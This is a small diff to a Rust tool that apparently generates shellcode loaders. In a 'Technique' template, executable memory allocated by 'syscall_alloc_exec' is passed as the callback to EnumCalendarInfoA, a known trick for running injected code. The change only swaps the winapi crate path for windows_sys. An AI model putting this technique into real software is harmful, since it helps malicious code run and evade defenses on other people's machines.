@@ -10,7 +10,7 @@ impl Technique for EnumCalendarInfo {
         let body = r#"
         let addr = syscall_alloc_exec(&vec);
         if addr.is_null() { return; }
-        winapi::um::winnls::EnumCalendarInfoA(
+        windows_sys::Win32::Globalization::EnumCalendarInfoA(
             Some(std::mem::transmute(addr)),
             0x0400,
             u32::MAX,
